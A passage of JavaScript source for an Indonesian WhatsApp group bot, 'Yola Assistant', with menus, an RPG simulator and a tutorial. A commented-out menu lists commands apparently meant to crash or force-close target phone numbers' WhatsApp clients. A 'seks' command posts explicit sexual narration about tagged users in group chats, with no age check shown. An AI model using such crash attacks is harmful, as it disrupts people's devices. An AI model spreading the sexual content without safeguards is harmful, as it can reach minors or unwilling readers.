        } else if (userRPG?.pendingAction && !rpgActionControlCommands.includes(command) && !essentialRpgCheckCommands.includes(command) && !command.startsWith('handle_')) {
            const actionType = userRPG.pendingAction.type.split('_')[0];
            const pendingActionName = userRPG.pendingAction.type.replace(/_pending/g, ' ').trim();
            return reply(`────୨ Yola Assistant ৎ────\n⏳ Anda memiliki persiapan aksi (${capital(pendingActionName)}). Gunakan *${prefix}${actionType}start* untuk memulai atau *${prefix}abandon${actionType === 'dungeon' ? 'dungeon' : (actionType === 'quest' ? 'quest' : '')}* untuk batal.\n────୨ Yola Assistant ৎ────`);
        }


        if (isCmd && command) {
            if (!['daftar', 'handle_daftar_role', 'handle_daftar_gender', 'pilihrole', 'pilihgender'].includes(command)) {
                await yola.sendMessage(m.chat, {
                    /*react: {
                        text: "🌸",
                        key: m.key
                    }*/
                }).catch(() => {});
            }
        }

        const getBotInfoText = (currentPrefix, speedCalcTime, yolaInstance) => {
    const currentSpeed = (performance.now() - speedCalcTime).toFixed(5) + " ms🚀";
    const os_ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const uptime = runtime(os.uptime());
    return `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│✧ *Creator* : ThanDz
│✧ *Nama Bot* : ${yolaInstance.user?.name || "Yola Asisten"}
│✧ *Versi* : V2.0 - Yola
│✧ *Prefix* : ${currentPrefix}
│✧ *Tipe* : Case
│✧ *CPU* : ${os.cpus().length} CPU ${os.cpus()[0].model}
│✧ *Aktif* : ${uptime}
│✧ *RAM* : ${free_ram}/${os_ram}
│✧ *Kecepatan* : ${currentSpeed}
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
};

/*const getBugMenuText = (currentPrefix) => `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *CFG (Crash/FC)* ↫
│
│✧ ${currentPrefix}lxz-crash 628xxx
│✧ ${currentPrefix}lxz-fc 628xxx
│✧ ${currentPrefix}lxz-papan 628xxx
│✧ ${currentPrefix}tfc 628xxx
│✧ *Delay*
│✧ ${currentPrefix}lxz-layy 628xxx
│✧ ${currentPrefix}lxz-hmph 628xxx
│✧ *Bug Tempat (PC/Target)*
│✧ ${currentPrefix}yola-lxz
│✧ ${currentPrefix}papanawok
│✧ *Bug Grup*
│✧ ${currentPrefix}yola-gcx
│✧ ${currentPrefix}yola-cgx
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;*/

const getOwnerMenuText = (currentPrefix) => `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *Owner Menu* ↫
│
│✧ ${currentPrefix}addprem [@tag/nomor]
│✧ ${currentPrefix}delprem [@tag/nomor]
│✧ ${currentPrefix}self
│✧ ${currentPrefix}public
│✧ ${currentPrefix}clearsesi / ${currentPrefix}clr
│✧ ${currentPrefix}enable notifadzan
│✧ ${currentPrefix}disable notifadzan
│✧ ${currentPrefix}chmv1
│✧ ${currentPrefix}chmv2
│✧ ${currentPrefix}additem [@tag/id] [item_id] [jumlah]
│✧ ${currentPrefix}addgold [@tag/id] [jumlah]
│✧ ${currentPrefix}addxp [@tag/id] [jumlah]
│✧ ${currentPrefix}setlevel [@tag/id] [level]
│✧ ${currentPrefix}resetrpg [@tag/id]
│✧ ${currentPrefix}yolaai [on/off]
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

/*const getFunMenuText = (currentPrefix) => `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *Fun Menu* ↫
│
│✧ ${currentPrefix}pinterest [query]
│✧ ${currentPrefix}animegecg
│✧ ${currentPrefix}animetickle
│✧ ${currentPrefix}animefoxgirl
│✧ ${currentPrefix}animenom
│✧ ${currentPrefix}animecuddle
│✧ ${currentPrefix}animeslap
│✧ ${currentPrefix}animewaifu
│✧ ${currentPrefix}qc [teks]
│✧ ${currentPrefix}txt2img [prompt]
│✧ ${currentPrefix}tiktok [link]
│✧ ${currentPrefix}balogo [teks1] [teks2]
│✧ ${currentPrefix}hytam (reply img)
│✧ ${currentPrefix}hd (reply img)
│✧ ${currentPrefix}iptrack [ip address] (Premium)
│✧ ${currentPrefix}nglc [judul] | [teks]
│✧ ${currentPrefix}angekan (reply img) [prompt opsional]
│✧ ${currentPrefix}hitamkan (reply img) [prompt opsional]
│✧ ${currentPrefix}aiimg (reply img) [prompt opsional]
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;*/

/*const getToolsMenuText = (currentPrefix) => `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *Tools Menu* ↫
│
│✧ ${currentPrefix}sticker (reply img/vid)
│✧ ${currentPrefix}brat [teks]
│✧ ${currentPrefix}bratv [teks]
│✧ ${currentPrefix}tourl (reply/kirim media)
│✧ ${currentPrefix}mediafire [link]
│✧ ${currentPrefix}cekid [link group/channel]
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;*/

/*const getNsfwMenuText = (currentPrefix) => `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *Nsfw Menu* ↫
│
│✧ ${currentPrefix}hentai-random
│✧ ${currentPrefix}trap
│✧ ${currentPrefix}hentai-neko / ${currentPrefix}hneko
│✧ ${currentPrefix}hentai-waifu / ${currentPrefix}nwaifu
│✧ ${currentPrefix}gasm
│✧ ${currentPrefix}milf
│✧ ${currentPrefix}wecchi
│✧ ${currentPrefix}whentai
│✧ ${currentPrefix}wmaid
│✧ ${currentPrefix}woral
│✧ ${currentPrefix}wass
│✧ ${currentPrefix}wwaifu
│✧ ${currentPrefix}wmilf
│✧ ${currentPrefix}pixivh [query]
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;*/

const getRpgMenuText = (currentPrefix) => `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *RPG Menu* ↫
│
│✧ ${currentPrefix}daftar nama.umur
│✧ ${currentPrefix}unreg
│✧ ${currentPrefix}profile [@tag/id]
│✧ ${currentPrefix}rpgcard [@tag/id]
│✧ ${currentPrefix}inventory / ${currentPrefix}inv
│✧ ${currentPrefix}use [item_id]
│✧ ${currentPrefix}release [slot]
│✧ ${currentPrefix}dungeonlist
│✧ ${currentPrefix}dungeon solo [id_dungeon]
│✧ ${currentPrefix}dungeon party [id_dungeon]
│✧ ${currentPrefix}dungeonstart
│✧ ${currentPrefix}dungeoncomplete
│✧ ${currentPrefix}heal [item_id] [jumlah]
│✧ ${currentPrefix}shoprpg
│✧ ${currentPrefix}buy [item_id] [jumlah]
│✧ ${currentPrefix}sell [item_id] [jumlah]
│✧ ${currentPrefix}marry [id_target]
│✧ ${currentPrefix}divorce
│✧ ${currentPrefix}seks
│✧ ${currentPrefix}requestlicense
│✧ ${currentPrefix}uprank
│✧ ${currentPrefix}trade [@target] [item_kamu] [jml_kamu] [item_target] [jml_target] [emas_kamu (opsional)]
│✧ ${currentPrefix}questlist
│✧ ${currentPrefix}acceptquest [quest_id]
│✧ ${currentPrefix}startquest
│✧ ${currentPrefix}abandonquest
│✧ ${currentPrefix}queststatus
│✧ ${currentPrefix}questcomplete
│✧ ${currentPrefix}createguild [nama_guild]
│✧ ${currentPrefix}joinguild [id_guild]
│✧ ${currentPrefix}leaveguild
│✧ ${currentPrefix}guildinfo [id_guild (opsional)]
│✧ ${currentPrefix}myguild
│✧ ${currentPrefix}kickguild [id_user] (Leader)
│✧ ${currentPrefix}createparty [nama_party]
│✧ ${currentPrefix}changepartyname [nama_baru]
│✧ ${currentPrefix}inviteparty [id_user]
│✧ ${currentPrefix}acceptparty
│✧ ${currentPrefix}leaveparty
│✧ ${currentPrefix}kickparty [id_user] (Leader)
│✧ ${currentPrefix}partyinfo
│✧ ${currentPrefix}listhouse
│✧ ${currentPrefix}buyhouse [house_id]
│✧ ${currentPrefix}myhouse
│✧ ${currentPrefix}jobs
│✧ ${currentPrefix}work [id_job]
│✧ ${currentPrefix}jobcomplete
│✧ ${currentPrefix}yolarpg [pertanyaan]
│✧ ${currentPrefix}leaderboard [petualang/guild/party]
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

const getGroupMenuText = (currentPrefix) => `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *Group Menu* ↫
│
│✧ ${currentPrefix}close / ${currentPrefix}clc
│✧ ${currentPrefix}open / ${currentPrefix}opc
│✧ ${currentPrefix}kick [@tag/nomor]
│✧ ${currentPrefix}hidetag [teks/reply]
│✧ ${currentPrefix}antivirtex [on/off]
│✧ ${currentPrefix}antiwame [on/off]
│✧ ${currentPrefix}antiasing [on/off]
│✧ ${currentPrefix}antitoxic [on/off]
│✧ ${currentPrefix}antilinkall [on/off]
│✧ ${currentPrefix}antilinkgc [on/off]
│✧ ${currentPrefix}addbadword [kata]
│✧ ${currentPrefix}delbadword [kata]
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

const getAiMenuText = (currentPrefix) => `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *Ai Menu* ↫
│628123456789.Aku
│✧ ${currentPrefix}yolaai [on/off]
│   ↳ _Atur status AI Yola (Global)._
│   _AI Yola aktif = Auto-reply di *semua grup* aktif._
│   _AI Yola nonaktif = Auto-reply di *semua grup* nonaktif._
│✧ ${currentPrefix}yolaa [pertanyaan]
│   ↳ _Bertanya pada Yola (Mode Formal)._
│✧ _Cara lain memanggil Yola: Sebut "Yola" atau "la", tag bot, atau reply pesan bot di grup (jika AI aktif)._
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

const getAllMenuCategoriesText = (currentPrefix) => `*Kategori Menu Tersedia:*
• ${currentPrefix}rpgmenu
• ${currentPrefix}aimenu
• ${currentPrefix}ownermenu
• ${currentPrefix}groupmenu
• ${currentPrefix}infobot
• ${currentPrefix}tutor

Ketik *.menu* untuk tampilan interaktif (jika Menu V1 aktif).`;

const getTutorText = (currentPrefix) => {
    return `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮
│↬ *Tutorial Perintah Yola Asisten* 📚 ↫
│
│✧ *Menu Utama & Info:*
│✧   • \`${currentPrefix}menu\`: Menampilkan menu utama interaktif.
│✧   • \`${currentPrefix}infobot\`: Info tentang bot Yola.
│✧   • \`${currentPrefix}owner\`: Info kontak Owner/Developer Yola.
│✧   • \`${currentPrefix}tqto\`: Ucapan terima kasih.
│✧   • \`${currentPrefix}tutor\`: Menampilkan tutorial ini.
│✧
│✧ *RPG (Role-Playing Game):*
│✧   • \`${currentPrefix}daftar nama.umur\`: Mendaftar sebagai petualang.
│✧   • \`${currentPrefix}unreg\`: Membatalkan registrasi RPG (data hilang permanen!).
│✧   • \`${currentPrefix}profile [@tag/id]\`: Melihat profil petualang.
│✧   • \`${currentPrefix}rpgcard [@tag/id]\`: Kartu ringkas info petualang.
│✧   • \`${currentPrefix}inventory\` / \`${currentPrefix}inv\`: Melihat isi tas.
│✧   • \`${currentPrefix}use [item_id]\`: Menggunakan item dari inventori (misal: equip senjata/armor).
│✧   • \`${currentPrefix}release [slot]\`: Melepas equipment dari slot (slot: weapon, armor, shield).
│✧   • \`${currentPrefix}shoprpg\`: Melihat toko item (pilih kategori via tombol/list jika Menu V1).
│✧   • \`${currentPrefix}buy [item_id] [jumlah]\`: Membeli item dari toko.
│✧   • \`${currentPrefix}sell [item_id] [jumlah]\`: Menjual item.
│✧   • \`${currentPrefix}heal [item_id] [jumlah]\`: Menggunakan item penyembuh HP.
│✧   • \`${currentPrefix}dungeonlist\`: Melihat daftar dungeon.
│✧   • \`${currentPrefix}dungeon solo/party [id_dungeon]\`: Mempersiapkan masuk dungeon.
│✧   • \`${currentPrefix}dungeonstart\`: Memulai dungeon yang sudah dipersiapkan.
│✧   • \`${currentPrefix}dungeoncomplete\`: Menyelesaikan dungeon (setelah waktu habis).
│✧   • \`${currentPrefix}questlist\`: Melihat daftar quest.
│✧   • \`${currentPrefix}acceptquest [id_quest]\`: Menerima quest.
│✧   • \`${currentPrefix}startquest\`: Memulai quest (jika quest berdurasi).
│✧   • \`${currentPrefix}abandonquest\`: Membatalkan quest aktif.
│✧   • \`${currentPrefix}queststatus\`: Melihat status quest aktif.
│✧   • \`${currentPrefix}questcomplete\`: Menyelesaikan quest & ambil hadiah.
│✧   • \`${currentPrefix}createguild [nama_guild]\`: Membuat guild baru.
│✧   • \`${currentPrefix}joinguild [id_guild]\`: Mengirim permintaan gabung guild.
│✧   • \`${currentPrefix}leaveguild\`: Keluar dari guild.
│✧   • \`${currentPrefix}guildinfo [id_guild (opsional)]\`: Info guild (ID opsional, jika tidak diisi, info guild sendiri).
│✧   • \`${currentPrefix}myguild\`: Info guild sendiri (sama seperti .guildinfo tanpa ID).
│✧   • \`${currentPrefix}kickguild [id_user] (Leader)\`: Mengeluarkan anggota.
│✧   • \`${currentPrefix}createparty [nama_party]\`: Membuat party baru.
│✧   • \`${currentPrefix}changepartyname [nama_baru]\`: Mengganti nama party.
│✧   • \`${currentPrefix}inviteparty [id_user]\`: (Leader Party) Mengundang anggota ke party.
│✧   • \`${currentPrefix}acceptparty\`: Menerima undangan party.
│✧   • \`${currentPrefix}leaveparty\`: Keluar dari party.
│✧   • \`${currentPrefix}kickparty [id_user] (Leader)\`: Mengeluarkan anggota party.
│✧   • \`${currentPrefix}partyinfo\`: Info party sendiri.
│✧   • \`${currentPrefix}listhouse\`: Melihat daftar rumah yang dijual.
│✧   • \`${currentPrefix}buyhouse [house_id]\`: Membeli rumah.
│✧   • \`${currentPrefix}myhouse\`: Melihat info rumah sendiri.
│✧   • \`${currentPrefix}jobs\`: Melihat daftar pekerjaan.
│✧   • \`${currentPrefix}work [id_job]\`: Mulai bekerja.
│✧   • \`${currentPrefix}jobcomplete\`: Menyelesaikan pekerjaan & ambil gaji.
│✧   • \`${currentPrefix}yolarpg [pertanyaan]\`: Bertanya pada Yola seputar RPG.
│✧
│✧ *AI Yola:*
│✧   • \`${currentPrefix}yolaai [on/off]\`: (Owner) Mengatur status AI Yola. Auto-reply di *semua grup* aktif saat AI Yola aktif.
│✧   • \`${currentPrefix}yolaa [pertanyaan]\`: Bertanya pada Yola (Mode Formal).
│✧   • _Cara lain memanggil Yola: Sebut "Yola", tag bot, atau reply pesan bot di grup (jika AI aktif)._
│✧
│✧ *Menu Owner (Khusus Owner):*
│✧   • \`${currentPrefix}addprem\`, \`${currentPrefix}delprem\`: Manajemen user Premium.
│✧   • \`${currentPrefix}self\`, \`${currentPrefix}public\`: Mode bot (pribadi/publik).
│✧   • \`${currentPrefix}clearsesi\`: Membersihkan file sesi bot.
│✧   • \`${currentPrefix}enable/disable notifadzan\`: Notifikasi adzan di grup.
│✧   • \`${currentPrefix}chmv1/chmv2\`: Mengubah gaya tampilan menu.
│✧   • \`${currentPrefix}additem\`, \`${currentPrefix}addgold\`, \`${currentPrefix}addxp\`, \`${currentPrefix}setlevel\`, \`${currentPrefix}resetrpg\`: Manipulasi data RPG user.
│✧   • \`${currentPrefix}ayolaai [on/off]\`
│✧
│✧ *Menu Grup (Admin):*
│✧   • \`${currentPrefix}close/open\`: Menutup/membuka grup.
│✧   • \`${currentPrefix}kick [@tag/nomor]\`: Mengeluarkan anggota.
│✧   • \`${currentPrefix}hidetag [teks]\`: Mention semua anggota secara tersembunyi.
│✧   • \`${currentPrefix}antivirtex\`, \`${currentPrefix}antiwame\`, \`${currentPrefix}antitoxic\`, \`${currentPrefix}antilinkall\`, \`${currentPrefix}antilinkgc\`, \`${currentPrefix}antiasing\` [on/off]: Mengatur fitur anti di grup.
│✧   • \`${currentPrefix}addbadword [kata]\`, \`${currentPrefix}delbadword [kata]\`: Manajemen kata terlarang.
│✧
│✧ Semoga tutorial ini membantu ya, Kak ${pushname}! Semangat! ><
╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
};


       /* const handleNsfwSimple = async (yolaInstance, msg, captionText, apiUrl, buttonText, ownerCheck, premiumCheck, replyFn, contextInfo) => {
            if (!ownerCheck && !premiumCheck) return replyFn(`────୨ Yola Assistant ৎ────\n🔒 Khusus Owner/Premium.\n────୨ Yola Assistant ৎ────`);
            await yolaInstance.sendMessage(msg.chat, {
                react: {
                    text: "⏳",
                    key: msg.key
                }
            });
            try {
                const response = await axios.get(apiUrl);
                let imageUrl;
                if (response.data?.url) imageUrl = response.data.url;
                else if (response.data?.link) imageUrl = response.data.link;
                else if (response.data?.images?.[0]?.url) imageUrl = response.data.images[0].url;
                else if (response.data?.result?.url) imageUrl = response.data.result.url;
                else if (response.data?.result?.link) imageUrl = response.data.result.link;
                else if (typeof response.data === 'string' && response.data.startsWith('http')) imageUrl = response.data;
                else if (response.data?.results?.[0]) imageUrl = response.data.results[0];
                else throw new Error("URL gambarnya gak ketemu di respons API nih, Kak...");

                const buttonId = `nsfw_next_${msg.command.replace(msg.prefix, '').toLowerCase()}`;
                let buttonsNsfw;
                if (currentMenuStyle === 'V1') {
                    buttonsNsfw = [{
                        buttonId: buttonId,
                        buttonText: {
                            displayText: buttonText
                        },
                        type: 1
                    }];
                }


                const messagePayload = {
                    image: {
                        url: imageUrl
                    },
                    caption: `────୨ Yola Assistant ৎ────\n${captionText}`,
                    footer: "Yola Asisten by ThanDz",
                    contextInfo: contextInfo.externalAdReply
                };

                if (currentMenuStyle === 'V1' && buttonsNsfw) {
                    messagePayload.buttons = buttonsNsfw;
                    messagePayload.headerType = 4;
                } else if (currentMenuStyle === 'V2') {
                    messagePayload.caption += `\n\nKetik \`${msg.prefix}${msg.command.split('-')[0]}next ${msg.command.replace(msg.prefix, '').toLowerCase()}\` untuk gambar berikutnya.\n────୨ Yola Assistant ৎ────`;
                }


                await yolaInstance.sendMessage(msg.chat, messagePayload, {
                    quoted: msg
                });
                await yolaInstance.sendMessage(msg.chat, {
                    react: {
                        text: "✅",
                        key: msg.key
                    }
                });
            } catch (error) {
                await replyFn(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal ngambil gambarnya: ${error.message}\n────୨ Yola Assistant ৎ────`);
                await yolaInstance.sendMessage(msg.chat, {
                    react: {
                        text: "❌",
                        key: msg.key
                    }
                });
            }
        };

        const handleNsfwNextButton = async (yolaInstance, msg, commandName, apiUrl, buttonText, ownerCheck, premiumCheck, replyFn, contextInfo) => {
            if (!ownerCheck && !premiumCheck) return replyFn(`────୨ Yola Assistant ৎ────\n🔒 Khusus Owner/Premium.\n────୨ Yola Assistant ৎ────`);
            await yolaInstance.sendMessage(msg.chat, {
                react: {
                    text: "⏳",
                    key: msg.key
                }
            });
            const tagName = commandName || "gambar";
            try {
                const response = await axios.get(apiUrl);
                let imageUrl;
                if (response.data?.url) imageUrl = response.data.url;
                else if (response.data?.link) imageUrl = response.data.link;
                else if (response.data?.images?.[0]?.url) imageUrl = response.data.images[0].url;
                else if (response.data?.result?.url) imageUrl = response.data.result.url;
                else if (response.data?.result?.link) imageUrl = response.data.result.link;
                else if (typeof response.data === 'string' && response.data.startsWith('http')) imageUrl = response.data;
                else if (response.data?.results?.[0]) imageUrl = response.data.results[0];
                else throw new Error(`Tidak ada URL ${tagName} (next).`);

                const buttonId = `nsfw_next_${commandName.replace(/\s+/g, '_').toLowerCase()}`;
                let buttonsNsfwNext;
                if (currentMenuStyle === 'V1') {
                    buttonsNsfwNext = [{
                        buttonId: buttonId,
                        buttonText: {
                            displayText: buttonText
                        },
                        type: 1
                    }];
                }

                const messagePayloadNext = {
                    image: {
                        url: imageUrl
                    },
                    caption: `────୨ Yola Assistant ৎ────\n💦 ${capital(tagName)}!`,
                    footer: `Yola Asisten by ThanDz`,
                    contextInfo: contextInfo.externalAdReply
                };

                if (currentMenuStyle === 'V1' && buttonsNsfwNext) {
                    messagePayloadNext.buttons = buttonsNsfwNext;
                    messagePayloadNext.headerType = 4;
                } else if (currentMenuStyle === 'V2') {
                    messagePayloadNext.caption += `\n\nKetik \`${prefix}${command.split('_')[0]}next ${commandName.replace(/\s+/g, '_').toLowerCase()}\` untuk gambar berikutnya.\n────୨ Yola Assistant ৎ────`;
                }

                await yolaInstance.sendMessage(msg.chat, messagePayloadNext, {
                    quoted: msg
                });
                await yolaInstance.sendMessage(msg.chat, {
                    react: {
                        text: "✅",
                        key: msg.key
                    }
                });
            } catch (error) {
                await replyFn(`────୨ Yola Assistant ৎ────\n❌ Gagal ${tagName} berikutnya: ${error.message}\n────୨ Yola Assistant ৎ────`);
                await yolaInstance.sendMessage(msg.chat, {
                    react: {
                        text: "❌",
                        key: msg.key
                    }
                });
            }
        };*/

        const example = async (teks, cmd) => reply(`────୨ Yola Assistant ৎ────\n*Contoh:*\n*${cmd}* ${teks}\n────୨ Yola Assistant ৎ────`);

        const startTime = performance.now();

        const runSimulation = async (userId, actionType, actionId, endTime, chatId, initialMessageKey = null) => {
            const user = registeredUsers[userId];
            const petualangName = user?.name || 'Petualang';
            let data;
            let eventTexts = [];
            let actionName = actionType;
            const totalDuration = endTime - Date.now();
             const numUpdates = 4;
            const interval = totalDuration / numUpdates;
            let updateTimes = [];
            for(let i = 1; i <= numUpdates; i++) {
                updateTimes.push(Date.now() + interval * i);
            }

            if (actionType === 'dungeon') {
                data = rpgDungeons.find(d => d.id === actionId);
                actionName = `Dungeon "${data?.name || actionId}"`;
                eventTexts = ["menjelajahi koridor gelap...", "mendengar suara aneh...", "beristirahat sejenak...", "memeriksa peta...", "melawan monster kecil...", "mencari harta karun..."];
            } else if (actionType === 'quest') {
                data = rpgQuests[actionId];
                 actionName = `Quest "${data?.name || actionId}"`;
                eventTexts = ["mengerjakan tugas...", "mengumpulkan informasi...", "melacak target...", "berpikir keras...", "hampir selesai...", "berinteraksi dengan NPC..."];
            } else if (actionType === 'job') {
                data = rpgJobs[actionId];
                actionName = `Pekerjaan "${data?.name || actionId}"`;
                eventTexts = data?.events || ["bekerja keras...", "menyelesaikan tugas...", "mendapatkan pengalaman...", "beristirahat sejenak...", "hampir gajian...", "menghadapi tantangan..."];
            }

            if (!data) return;
            let simulationLogs = [`────୨ Yola Assistant ৎ────\n🚀 ${petualangName} memulai simulasi ${capital(actionType)} "${data.name}"!`];
            let currentUpdateIndex = 0;
            let messageKey = initialMessageKey;

            try {
                if (!messageKey) {
                    const initialMsg = await yola.sendMessage(chatId, { text: simulationLogs.join('\n'), contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                    messageKey = initialMsg.key;
                } else {
                     await yola.sendMessage(chatId, { text: simulationLogs.join('\n'), edit: messageKey, contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply }).catch(e => { messageKey = null; });
                     if (!messageKey) {
                        const initialMsg = await yola.sendMessage(chatId, { text: simulationLogs.join('\n'), contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                        messageKey = initialMsg.key;
                     }
                }


                while (Date.now() < endTime && currentUpdateIndex < numUpdates) {
                    const timeUntilNextUpdate = updateTimes[currentUpdateIndex] - Date.now();
                    if (timeUntilNextUpdate > 1000) {
                       await sleep(timeUntilNextUpdate);
                    } else if (timeUntilNextUpdate > 0) {
                         await sleep(timeUntilNextUpdate);
                    } else {
                         await sleep(1000);
                    }


                    const currentUser = registeredUsers[userId];
                    if (!currentUser || !currentUser.rpg || !currentUser.rpg.currentAction || currentUser.rpg.currentAction.endTime !== endTime) {
                        return;
                    }

                    let eventText = "";
                    if (actionType === 'dungeon') {
                        const eventRoll = Math.random();
                        if (data.monsters && data.monsters.length > 0 && eventRoll < 0.65) {
                            const monsterType = pickRandom(data.monsters);
                            const numKilled = generateRandomNumber(1, 2);
                            eventText = `💥 ${petualangName} mengalahkan ${numKilled}x ${capital(monsterType)}!`;
                            updateQuestProgress(userId, 'kill', {
                                target: monsterType,
                                location: actionId
                            }, numKilled);
                        } else if (data.events && data.events.length > 0 && eventRoll < 0.9) {
                            eventText = `🔎 ${petualangName} ${pickRandom(data.events)}`;
                        } else if (eventTexts.length > 0) {
                            eventText = `🚶 ${petualangName} ${pickRandom(eventTexts)}`;
                        }
                    } else if (eventTexts.length > 0) {
                         eventText = `${actionType === 'job' ? '💼' : '⏳'} ${petualangName} sedang ${pickRandom(eventTexts)}`;
                    }

                    if (eventText) {
                        simulationLogs.push(eventText);
                        if (messageKey) {
                           await yola.sendMessage(chatId, { text: simulationLogs.join('\n'), edit: messageKey, contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply }).catch(e => { messageKey = null; });
                        } else {
                             const msg = await yola.sendMessage(chatId, { text: simulationLogs.join('\n'), contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                             messageKey = msg.key;
                        }
                        currentUpdateIndex++;
                    }
                }

                 await sleep(Math.max(0, endTime - Date.now() - 1000));

                const finalSimMsg = `✅ Waktu untuk *${data.name}* telah habis! Gunakan *${prefix}${actionType}${actionType === 'job' ? 'complete' : 'complete'}* untuk melihat hasil!\n────୨ Yola Assistant ৎ────`;
                 simulationLogs.push(finalSimMsg);
                 if (messageKey) {
                    try {
                        await yola.sendMessage(chatId, { text: simulationLogs.join('\n'), edit: messageKey, contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                    } catch (editError) {
                         await yola.sendMessage(chatId, { text: finalSimMsg, contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                    }
                 } else {
                    await yola.sendMessage(chatId, { text: finalSimMsg, contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                 }


            } catch (simError) {
                const errorMsg = `────୨ Yola Assistant ৎ────\n⚠️ Terjadi gangguan pada simulasi ${actionType} ${data.name}. Coba gunakan ${prefix}${actionType}complete.\n────୨ Yola Assistant ৎ────`;
                 if (messageKey) {
                    try {
                        await yola.sendMessage(chatId, { text: simulationLogs.join('\n') + `\n${errorMsg}`, edit: messageKey, contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                    } catch (editError) {
                        await yola.sendMessage(chatId, { text: errorMsg, contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                    }
                 } else {
                    await yola.sendMessage(chatId, { text: errorMsg, contextInfo: defaultContextInfoBuilder(petualangName, actionType).externalAdReply });
                 }
            }
        };

        const runSeksSimulation = async (yolaInstance, chatId, user1Jid, user2Jid) => {
            const user1 = registeredUsers[user1Jid];
            const user2 = registeredUsers[user2Jid];
            const name1 = user1.name;
            const name2 = user2.name;
            const gender1 = user1.rpg.gender;
            const gender2 = user2.rpg.gender;

            let messages = [];
            messages.push(`🔥 *${name1}* dan *${name2}* saling bertatapan penuh gairah... _deg-degan_`);
            messages.push(`💋 *${name1}* mulai mendekat, membisikkan kata-kata manis ke telinga *${name2}*...`);
            messages.push(`💨 Nafas mereka jadi berat... *${name2}* memejamkan mata, siap menerima sentuhan *${name1}*...`);
            messages.push(`🖐️ Tangan *${name1}* mulai menjelajahi tubuh *${name2}*, membuat *${name2}* merinding keenakan... _menggeliat_`);

            let malePartner, femalePartner;
            let canPenetrate = false;

            if (gender1 === 'pria' && gender2 === 'wanita') {
                malePartner = name1;
                femalePartner = name2;
                canPenetrate = true;
            } else if (gender1 === 'wanita' && gender2 === 'pria') {
                malePartner = name2;
                femalePartner = name1;
                canPenetrate = true;
            }

            if (canPenetrate) {
                messages.push(`👖 Pakaian mulai terlepas satu per satu... *${malePartner}* gak sabar lagi buat nyatu sama *${femalePartner}*...`);
                messages.push(`🍆 *${malePartner}* dengan lembut memasukkan kejantanannya ke dalam kehangatan *${femalePartner}*... _ahh~_`);
                messages.push(`💞 Mereka bergerak bersama, saling mengisi dan melengkapi... Desahan nikmat terdengar di seluruh ruangan... _ohh... yes..._`);
                messages.push(`💦 Puncak kenikmatan semakin dekat! *${malePartner}* mengerang, mengeluarkan semua cintanya di dalam *${femalePartner}*... _cumming_`);
            } else if (gender1 === gender2) {
                messages.push(`💞 Mereka saling memuaskan dengan cara mereka sendiri, mengeksplorasi setiap lekuk tubuh pasangannya... _hmmphh..._`);
                messages.push(`🌟 Sensasi luar biasa menjalar! Keduanya mencapai orgasme bersamaan, berpelukan erat... _puas_`);
            } else {
                messages.push(`💞 Mereka saling membelai dan mencumbu, menikmati setiap momen keintiman... _nikmat_`);
                messages.push(`🌟 Akhirnya, mereka berdua mencapai puncak bersama, tubuh gemetar karena sensasi yang luar biasa... _orgasme_`);
            }

            messages.push(`😴 Setelah sesi yang panas, *${name1}* dan *${name2}* terbaring lemas, saling berpelukan... _capek tapi bahagia_`);
            messages.push(`🥵💦 Sesi intim antara *${name1}* dan *${name2}* udah selesai. Jangan lupa istirahat yaa biar seger lagi! ><`);

            let currentMessage = `────୨ Yola Assistant ৎ────\n`;
            const initialMsg = await yolaInstance.sendMessage(chatId, {
                text: currentMessage + messages[0],
                contextInfo: defaultContextInfoBuilder(name1, 'seks').externalAdReply,
                mentionedJid: [user1Jid, user2Jid]
            });

            for (let i = 1; i < messages.length; i++) {
                await sleep(generateRandomNumber(3000, 5000));
                currentMessage += `\n\n${messages[i]}`;
                await yolaInstance.sendMessage(chatId, {
                    text: currentMessage,
                    edit: initialMsg.key,
                    contextInfo: defaultContextInfoBuilder(name1, 'seks').externalAdReply,
                    mentionedJid: [user1Jid, user2Jid]
                }).catch(e => {
                });
            }
        };

        switch (command) {
            case "menu":
            case "help":
            case "cmd":
            case 'rpgmenu':
            case 'aimenu':
            case 'ownermenu':
            case 'groupmenu':
            case 'allmenu':
            case 'infobot':
            case 'tutor': {
                await yola.sendMessage(m.chat, {
                    react: {
                        text: "💖",
                        key: m.key,
                    },
                });

                const menuInfoText = getBotInfoText(prefix, startTime, yola);
                let menuFooterText;

                const menuMapping = {
                    'rpgmenu': {
